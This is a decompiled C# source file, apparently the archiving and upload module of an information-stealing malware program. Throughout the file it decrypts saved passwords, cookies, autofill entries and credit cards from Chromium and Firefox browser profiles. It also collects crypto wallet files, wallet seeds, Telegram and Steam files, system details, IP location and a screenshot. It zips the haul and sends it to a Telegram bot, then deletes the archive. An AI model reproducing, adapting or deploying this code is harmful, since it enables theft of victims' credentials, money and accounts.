using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using client.Body;
using client.Helpers;
using client.Models;

namespace client.Decryption
{
	// Token: 0x02000025 RID: 37
	internal class Build
	{
		// Token: 0x060000EB RID: 235 RVA: 0x000035A0 File Offset: 0x000017A0
		public static void sendFile(string file, string type = "Document", string text = "")
		{
			if (!File.Exists(file))
			{
				return;
			}
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(file);
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), type.ToLower(), file);
				httpClient.PostAsync(string.Concat(new string[]
				{
					"https://api.telegram.org/bot",
					Config.TelegramBot,
					"/send",
					type,
					"?chat_id=",
					Config.UserID,
					"&caption=",
					text
				}), multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x00003654 File Offset: 0x00001854
		public static void CreateArchive(ExecutingAssemblyResult ear)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			int num = 0;
			string s = string.Concat(new string[]
			{
				"\r\n\r\nInstall location: ",
				ear.Information.Install_Path ?? "Unknown",
				"\r\nBuild Tag: ",
				ear.Tag,
				"\r\n\r\nUsername: ",
				ear.Information.Username,
				"\r\nOperating system: ",
				ear.Information.Operating_System,
				"\r\nProduct key: ",
				ear.Information.Windows_Key,
				"\r\n\r\nIP: ",
				ear.Information.IP ?? "Unknown",
				"\r\nCountry: ",
				ear.Information.Country_Name ?? "Unknown",
				"\r\nLocation: ",
				ear.Information.Region ?? "Unknown",
				", ",
				ear.Information.City ?? "Unknown",
				"\r\nZip: ",
				ear.Information.Zip ?? "Unknown",
				"\r\n\r\nScreen: ",
				string.Join(" // ", ear.Information.ScreenMetrics),
				"\r\nProcessor: ",
				ear.Information.Processor,
				"\r\nGraphic Card: ",
				ear.Information.Graphic_Card,
				"\r\nRAM: ",
				ear.Information.Operating_Memory,
				"\r\n\r\nAntiviruses: ",
				string.Join(", ", new string[]
				{
					ear.Information.Antiviruses
				}) ?? "None"
			});
			ZipHelper.AddStream(Encoding.UTF8.GetBytes(s), "Information.txt");
			if (ear.Screenshot != null)
			{
				ZipHelper.AddStream(ear.Screenshot, "Screenshot.png");
			}
			List<string> list4 = new List<string>();
			List<string> list5 = new List<string>();
			foreach (ChromiumBrowserStructure chromiumBrowserStructure in ear.ChromiumData)
			{
				foreach (ChromiumDefaultProfile chromiumDefaultProfile in chromiumBrowserStructure.ChromiumProfiles)
				{
					List<string> list6 = new List<string>();
					List<string> list7 = new List<string>();
					List<string> list8 = new List<string>();
					if (chromiumDefaultProfile.ChromiumLoginData != null)
					{
						foreach (List<string> list9 in Build.ParseSQL(FileHelper.ReadFile(chromiumDefaultProfile.ChromiumLoginData), "logins", new List<string>
						{
							"origin_url",
							"username_value"
						}, "password_value", chromiumBrowserStructure.PrivateKey))
						{
							if (!string.IsNullOrEmpty(list9[1]))
							{
								list4.Add(Build.FormatPass(list9[0], list9[1], list9[2], chromiumBrowserStructure.ChromiumBrowserName, chromiumDefaultProfile.ChromiumProfileName));
							}
						}
					}
					if (chromiumDefaultProfile.ChromiumCookies != null)
					{
						foreach (List<string> list10 in Build.ParseSQL(FileHelper.ReadFile(chromiumDefaultProfile.ChromiumCookies), "cookies", new List<string>
						{
							"host_key",
							"path",
							"is_secure",
							"expires_utc",
							"name"
						}, "encrypted_value", chromiumBrowserStructure.PrivateKey))
						{
							list6.Add(Build.FormatCookie(list10[0], list10[0].StartsWith(".").ToString().ToUpper(), list10[1], list10[2].Contains("1").ToString().ToUpper(), list10[3], list10[4], list10[5]));
						}
					}
					if (chromiumDefaultProfile.ChromiumWebData != null)
					{
						foreach (List<string> list11 in Build.ParseSQL(FileHelper.ReadFile(chromiumDefaultProfile.ChromiumWebData), "autofill", new List<string>
						{
							"name",
							"value"
						}, null, null))
						{
							list7.Add(Build.FormatAutofill(list11[0], list11[1]));
						}
					}
					if (chromiumDefaultProfile.ChromiumWebData != null)
					{
						foreach (List<string> list12 in Build.ParseSQL(FileHelper.ReadFile(chromiumDefaultProfile.ChromiumWebData), "credit_cards", new List<string>
						{
							"name_on_card",
							"expiration_month",
							"expiration_year"
						}, "card_number_encrypted", chromiumBrowserStructure.PrivateKey))
						{
							list5.Add(Build.FormatCC(list12[3], list12[1] + "/" + list12[2], list12[0], chromiumBrowserStructure.ChromiumBrowserName, chromiumDefaultProfile.ChromiumProfileName));
						}
					}
					foreach (DefaultFileStructure defaultFileStructure in chromiumDefaultProfile.ChromiumExtensions)
					{
						List<string> list13 = defaultFileStructure.FileName.Split(new char[]
						{
							'\\'
						}).ToList<string>();
						string str = list13.Last<string>();
						list13.Remove(list13.Last<string>());
						list13[0] = string.Concat(new string[]
						{
							list13[0],
							"_",
							chromiumBrowserStructure.ChromiumBrowserName,
							"[",
							chromiumDefaultProfile.ChromiumProfileName,
							"]"
						});
						ZipHelper.AddStream(defaultFileStructure.FileContent, "Files\\Wallets\\" + string.Join("\\", list13) + "\\" + str);
						list8.Add(list13[0]);
					}
					num += list6.Count<string>();
					if (list6.Count<string>() > 0)
					{
						ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("", list6)), string.Concat(new string[]
						{
							"Browsers\\Cookies\\",
							chromiumBrowserStructure.ChromiumBrowserName,
							"[",
							chromiumDefaultProfile.ChromiumProfileName,
							"]_Cookies.txt"
						}));
					}
					if (list7.Count<string>() > 0)
					{
						ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("", list7)), string.Concat(new string[]
						{
							"Browsers\\Autofills\\",
							chromiumBrowserStructure.ChromiumBrowserName,
							"[",
							chromiumDefaultProfile.ChromiumProfileName,
							"]_Autofills.txt"
						}));
					}
					list3.AddRange(list8);
				}
			}
			list.AddRange(list4);
			list2.AddRange(list2);
			List<string> list14 = new List<string>();
			foreach (GeckoBrowserStructure geckoBrowserStructure in ear.GeckoData)
			{
				foreach (GeckoDefaultProfile geckoDefaultProfile in geckoBrowserStructure.GeckoProfiles)
				{
					List<string> list15 = new List<string>();
					List<string> list16 = new List<string>();
					if (geckoDefaultProfile.GeckoLoginData != null && geckoDefaultProfile.KeyDB != null)
					{
						foreach (List<string> list17 in Build.GeckoPass(FileHelper.ReadFile(geckoDefaultProfile.GeckoLoginData), geckoDefaultProfile.KeyDB))
						{
							if (!string.IsNullOrEmpty(list17[1]))
							{
								list14.Add(Build.FormatPass(list17[0], list17[1], list17[2], geckoBrowserStructure.GeckoBrowserName, geckoDefaultProfile.GeckoProfileName));
							}
						}
					}
					if (geckoDefaultProfile.GeckoCookies != null)
					{
						foreach (List<string> list18 in Build.ParseSQL(FileHelper.ReadFile(geckoDefaultProfile.GeckoCookies), "moz_cookies", new List<string>
						{
							"host",
							"path",
							"isSecure",
							"expiry",
							"name",
							"value"
						}, null, null))
						{
							list15.Add(Build.FormatCookie(list18[0], list18[0].StartsWith(".").ToString().ToUpper(), list18[1], list18[2].Contains("1").ToString().ToUpper(), list18[3], list18[4], list18[5]));
						}
					}
					if (geckoDefaultProfile.GeckoWebData != null)
					{
						foreach (List<string> list19 in Build.ParseSQL(FileHelper.ReadFile(geckoDefaultProfile.GeckoWebData), "moz_formhistory", new List<string>
						{
							"fieldname",
							"value"
						}, null, null))
						{
							list16.Add(Build.FormatAutofill(list19[0], list19[1]));
						}
					}
					num += list15.Count<string>();
					if (list15.Count<string>() > 0)
					{
						ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("", list15)), string.Concat(new string[]
						{
							"Browsers\\Cookies\\",
							geckoBrowserStructure.GeckoBrowserName,
							"[",
							geckoDefaultProfile.GeckoProfileName,
							"]_Cookies.txt"
						}));
					}
					if (list16.Count<string>() > 0)
					{
						ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("", list16)), string.Concat(new string[]
						{
							"Browsers\\Autofills\\",
							geckoBrowserStructure.GeckoBrowserName,
							"[",
							geckoDefaultProfile.GeckoProfileName,
							"]_Autofills.txt"
						}));
					}
				}
			}
			list.AddRange(list14);
			foreach (DefaultFileStructure defaultFileStructure2 in ear.DefaultFiles)
			{
				List<string> list20 = defaultFileStructure2.FileName.Split(new char[]
				{
					'\\'
				}).ToList<string>();
				switch (defaultFileStructure2.Service)
				{
				case DataType.Discord:
					break;
				case DataType.Telegram:
					try
					{
						ZipHelper.AddStream(defaultFileStructure2.FileContent, "Files\\Telegram\\" + defaultFileStructure2.FileName);
						continue;
					}
					catch
					{
						continue;
					}
					break;
				case DataType.FTP:
					continue;
				case DataType.Grabber:
					goto IL_B94;
				case DataType.Steam:
					goto IL_BB7;
				case DataType.Wallets:
					goto IL_BDA;
				default:
					continue;
				}
				try
				{
					ZipHelper.AddStream(defaultFileStructure2.FileContent, "Files\\" + defaultFileStructure2.FileName);
					continue;
				}
				catch
				{
					continue;
				}
				IL_B94:
				try
				{
					ZipHelper.AddStream(defaultFileStructure2.FileContent, "Files\\Grabber" + defaultFileStructure2.FileName);
					continue;
				}
				catch
				{
					continue;
				}
				IL_BB7:
				try
				{
					ZipHelper.AddStream(defaultFileStructure2.FileContent, "Files\\Steam\\" + defaultFileStructure2.FileName);
					continue;
				}
				catch
				{
					continue;
				}
				IL_BDA:
				try
				{
					ZipHelper.AddStream(defaultFileStructure2.FileContent, "Files\\Wallets\\" + defaultFileStructure2.FileName);
					list3.Add(list20[0]);
				}
				catch
				{
				}
			}
			if (Grabber.ParsedSeeds.Data.Count<string>() > 0)
			{
				ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("\n\n", Grabber.ParsedSeeds.Data)), Grabber.ParsedSeeds.Path + Grabber.ParsedSeeds.FileName);
			}
			if (list.Count<string>() > 0)
			{
				ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("", list)), "Browsers\\Passwords.txt");
			}
			if (list2.Count<string>() > 0)
			{
				ZipHelper.AddStream(Encoding.UTF8.GetBytes(string.Join("", list2)), "Browsers\\CreditCards.txt");
			}
			list3 = list3.Distinct<string>().ToList<string>();
			try
			{
				Random random = new Random();
				byte[] bytes = ZipHelper.CreateArchive();
				string str2 = random.Next(999, 99999999).ToString();
				File.WriteAllBytes(Path.GetTempPath() + "\\" + str2 + ".zip", bytes);
				string text = string.Concat(new string[]
				{
					"\ud83d\udd14New Log From: ",
					ear.Information.IP ?? "Unknown",
					"\n\ud83c\udfd7Build Tag: ",
					ear.Tag ?? "Unknown",
					"\n\ud83d\udd10Password: ",
					list14.Count.ToString(),
					"\n\ud83c\udf6aCookie: ",
					num.ToString(),
					" \n\ud83d\udcb3card: ",
					list2.Count.ToString(),
					" \n"
				});
				Build.sendFile(Path.GetTempPath() + "\\" + str2 + ".zip", "Document", text);
				File.Delete(Path.GetTempPath() + "\\" + str2 + ".zip");
			}
			catch
			{
			}
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000461C File Offset: 0x0000281C
		private static List<List<string>> ParseSQL(byte[] sqlfile, string dbname, List<string> parameters, string to_decrypt, byte[] key)
		{
			List<List<string>> list = new List<List<string>>();
			if (sqlfile == null)
			{
				return list;
			}
			SQLHelper sql = new SQLHelper(sqlfile);
			sql.ReadTable(dbname);
			int i;
			int j;
			for (i = 0; i < sql.GetRowCount(); i = j + 1)
			{
				List<string> data = new List<string>();
				parameters.ForEach(delegate(string p)
				{
					data.Add(Build.GetUTF8(sql.GetValue(i, p)));
				});
				if (to_decrypt != null)
				{
					data.Add(Build.GetUTF8(Aes.DecryptValue(sql.GetValue(i, to_decrypt), key)));
				}
				list.Add(data);
				j = i;
			}
			return list;
		}

		// Token: 0x060000EE RID: 238 RVA: 0x000046F0 File Offset: 0x000028F0
		public static List<List<string>> GeckoPass(byte[] passfile, string keyfile)
		{
			List<List<string>> list = new List<List<string>>();
			if (passfile == null)
			{
				return list;
			}
			byte[] key = keyfile.EndsWith("key3.db") ? GeckoHelper.Key3(FileHelper.ReadFile(keyfile)) : GeckoHelper.Key4(FileHelper.ReadFile(keyfile));
			string @string = Encoding.UTF8.GetString(passfile);
			if (@string.StartsWith("{"))
			{
				FirefoxList firefoxList = JsonHelper.Deserialize<FirefoxList>(@string);
				Asn1Der asn1Der = new Asn1Der();
				using (List<FirefoxLogins>.Enumerator enumerator = firefoxList.logins.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						FirefoxLogins firefoxLogins = enumerator.Current;
						try
						{
							List<string> list2 = new List<string>();
							Asn1DerObject asn1DerObject = asn1Der.Parse(Convert.FromBase64String(firefoxLogins.encryptedUsername));
							Asn1DerObject asn1DerObject2 = asn1Der.Parse(Convert.FromBase64String(firefoxLogins.encryptedPassword));
							list2.Add(firefoxLogins.hostname);
							list2.Add(Regex.Replace(TripleDESHelper.DESCBC_Decrypt_String(key, asn1DerObject.objects[0].objects[1].objects[1].Data, asn1DerObject.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", ""));
							list2.Add(Regex.Replace(TripleDESHelper.DESCBC_Decrypt_String(key, asn1DerObject2.objects[0].objects[1].objects[1].Data, asn1DerObject2.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", ""));
							list.Add(list2);
						}
						catch
						{
						}
					}
					return list;
				}
			}
			SQLHelper sqlhelper = new SQLHelper(passfile);
			sqlhelper.ReadTable("moz_logins");
			Asn1Der asn1Der2 = new Asn1Der();
			for (int i = 0; i < sqlhelper.GetRowCount(); i++)
			{
				List<string> list3 = new List<string>();
				Asn1DerObject asn1DerObject3 = asn1Der2.Parse(Convert.FromBase64String(sqlhelper.GetValue(i, "encryptedUsername")));
				Asn1DerObject asn1DerObject4 = asn1Der2.Parse(Convert.FromBase64String(sqlhelper.GetValue(i, "encryptedPassword")));
				list3.Add(sqlhelper.GetValue(i, "hostname"));
				list3.Add(Regex.Replace(TripleDESHelper.DESCBC_Decrypt_String(key, asn1DerObject3.objects[0].objects[1].objects[1].Data, asn1DerObject3.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", ""));
				list3.Add(Regex.Replace(TripleDESHelper.DESCBC_Decrypt_String(key, asn1DerObject4.objects[0].objects[1].objects[1].Data, asn1DerObject4.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", ""));
				list.Add(list3);
			}
			return list;
		}

		// Token: 0x060000EF RID: 239 RVA: 0x00004A28 File Offset: 0x00002C28
		public static string MD5(byte[] inputData)
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(inputData, 0, inputData.Length);
			memoryStream.Seek(0L, SeekOrigin.Begin);
			string result;
			using (MD5 md = System.Security.Cryptography.MD5.Create())
			{
				result = BitConverter.ToString(md.ComputeHash(memoryStream)).Replace("-", "").ToLowerInvariant();
			}
			return result;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x00004A94 File Offset: 0x00002C94
		private static string GetUTF8(string str)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(Encoding.Default.GetBytes(str));
			}
			catch
			{
				result = str;
			}
			return result;
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00004AD0 File Offset: 0x00002CD0
		private static string FormatPass(string hostname, string username, string password, string browser, string profile)
		{
			return string.Concat(new string[]
			{
				"Hostname: ",
				hostname,
				"\nUsername: ",
				username,
				"\nPassword: ",
				password,
				"\nBrowser: ",
				browser,
				" [",
				profile,
				"]\n\n"
			});
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x00004B30 File Offset: 0x00002D30
		private static string FormatCookie(string hostname, string tailmatch, string path, string secure, string expires, string name, string value)
		{
			return string.Concat(new string[]
			{
				hostname,
				"\t",
				tailmatch,
				"\t",
				path,
				"\t",
				secure,
				"\t",
				expires,
				"\t",
				name,
				"\t",
				value,
				"\n"
			});
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x00004BA5 File Offset: 0x00002DA5
		private static string FormatAutofill(string name, string value)
		{
			return string.Concat(new string[]
			{
				"Name: ",
				name,
				"\nValue: ",
				value,
				"\n\n"
			});
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x00004BD4 File Offset: 0x00002DD4
		private static string FormatCC(string number, string exp, string placeholder, string browser, string profile)
		{
			return string.Concat(new string[]
			{
				"Number: ",
				number,
				"\nExp: ",
				exp,
				"\nPlaceholder: ",
				placeholder,
				"\nBrowser: ",
				browser,
				" [",
				profile,
				"]\n\n"
			});
		}
	}
}
